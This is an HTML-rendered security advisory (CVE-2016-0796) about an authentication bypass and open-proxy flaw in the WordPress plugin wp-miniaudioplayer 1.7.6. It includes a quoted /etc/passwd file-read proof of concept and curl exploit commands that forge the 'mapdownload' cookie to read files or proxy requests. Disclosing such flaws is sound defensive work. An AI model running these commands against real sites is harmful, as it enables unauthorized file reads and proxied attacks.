<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title></title>
<meta name="generator" content="HTML::TextToHTML v2.51"/>
</head>
<body>
<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
    white-space: -moz-pre-wrap; /</em> Firefox <em>/
    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
    white-space: -o-pre-wrap;   /</em> Opera 7 */
    word-wrap: break-word;<br/>
}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 162&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; Open Proxy &amp; Authentication by pass for wordpress plugin wp-miniaudioplayer v1.7.6&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2016-02-01&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href=" <a href="https://wordpress.org/plugins/wp-miniaudioplayer">https://wordpress.org/plugins/wp-miniaudioplayer</a>"&gt; <a href="https://wordpress.org/plugins/wp-miniaudioplayer&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://wordpress.org/plugins/wp-miniaudioplayer&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt; <a href="https://profiles.wordpress.org/pupunzi/&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://profiles.wordpress.org/pupunzi/&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2016-02-12&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; @pupunzi&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;Transform your mp3 audio files into a nice, small light HTML5 player.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;The code in map_download.php was improperly patched to fix an LFI
vulnerability reported here:
</p><p><a href="http://0day.today/exploit/24536">http://0day.today/exploit/24536</a><br/>
That POC was:<br/>
<a href="http://victim.com/wp-content/plugins/wp-miniaudioplayer/map_download.php?fi">http://victim.com/wp-content/plugins/wp-miniaudioplayer/map_download.php?fi</a>
leurl=/etc/passwd
</p><p>The fix had faulty authentication code in map_download.php that can easily
be bypassed by setting<br/>
The required cookie:
</p><p>8 if(!isset($_COOKIE[&amp;quot;mapdownload&amp;quot;]) || $_COOKIE[&amp;quot;mapdownload&amp;quot;] !== &amp;quot;true&amp;quot;)
9   die ($_COOKIE[&amp;quot;mapdownload&amp;quot;].&amp;#039;  &amp;lt;b&amp;gt;Something goes wrong, you don\&amp;#039;t
have permission to use this page, sorry.&amp;lt;/b&amp;gt;&amp;#039;) ;
</p>
<p>A vulnerable installation of this plugin can be used to download files
with the extension<br/>
mp3,mp4a,wav and ogg from any where the web server application has read
access to the system:
</p><p>PoC 1:
</p><p>$ curl<br/>
&amp;quot;<a href="http://wpsite/wp-content/plugins/wp-miniaudioplayer/map_download.php?fileu">http://wpsite/wp-content/plugins/wp-miniaudioplayer/map_download.php?fileu</a>
rl=/tmp/s3kr3t_audio_file.mp3&amp;quot;  --cookie &amp;quot;mapdownload=true&amp;rdquo;
</p><p>I also noticed with the use of fopen() you have the ability to also fetch
URLs which would allow a malicious person to use this plugin as a blind
proxy.  You could download mp3&amp;rsquo;s through it or use it to proxy attacks via
HTTP GET requests.  Since the code to check the file extension is done
after the request is made you can get two
</p><p>Request to the target server regardless of the file extension restrictions:
</p><p>$ curl<br/>
&amp;quot;<a href="http://192.168.0.2/wp-content/plugins/wp-miniaudioplayer/map_download.php">http://192.168.0.2/wp-content/plugins/wp-miniaudioplayer/map_download.php</a>?
fileurl=<a href="http://192.168.0.3/tee&amp;quot;.php&amp;quot">http://192.168.0.3/tee&amp;quot;.php&amp;quot</a>;  --cookie &amp;quot;mapdownload=true
</p>
<p>192.168.0.2 - - [02/Feb/2016:21:52:32 -0500] &amp;quot;GET /test.php HTTP/1.0&amp;quot; 200
187 &amp;quot;-&amp;quot; &amp;quot;-&amp;quot;<br/>
<a href="telnet://192.168.0.2">192.168.0.2</a> - - [02/Feb/2016:21:52:32 -0500] &amp;quot;GET /test.php HTTP/1.0&amp;quot; 200
187 &amp;quot;-&amp;quot; &amp;quot;-&amp;quot;
</p>
<p>So 2x DoS amplification, the first is to check if the file exists and the
second is to finally read data from the file.&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2016-0796&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=162"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;curl &lt;span style="color: #0000ff;"&gt;&amp;quot;<a href="http://wpsite/wp-content/plugins/wp-miniaudioplayer/map_download.php?fileurl=/tmp/s3kr3t_audio_file.mp3&amp;quot;&lt;/span&gt">http://wpsite/wp-content/plugins/wp-miniaudioplayer/map_download.php?fileurl=/tmp/s3kr3t_audio_file.mp3&amp;quot;&lt;/span&gt</a>;  &lt;span style="color: #339933;"&gt;--&lt;/span&gt;cookie &lt;span style="color: #0000ff;"&gt;&amp;quot;mapdownload=true&acirc;Äù&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #0000ff;"&gt;curl &amp;quot;&lt;/span&gt;http&lt;span style="color: #339933;"&gt;:&lt;/span&gt;&lt;span style="color: #666666; font-style: italic;"&gt;//192.168.0.2/wp-content/plugins/wp-miniaudioplayer/map_download.php? fileurl=<a href="http://192.168.0.3/tee&amp;quot;.php&amp;quot">http://192.168.0.3/tee&amp;quot;.php&amp;quot</a>;  --cookie &amp;quot;mapdownload=true&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapidlabs.com/advisory.php?v=162">http://www.vapidlabs.com/advisory.php?v=162</a>"&gt;<a href="http://www.vapidlabs.com/advisory.php?v=162&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapidlabs.com/advisory.php?v=162&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
&lt;/html&gt;
</p>

</body>
</html>
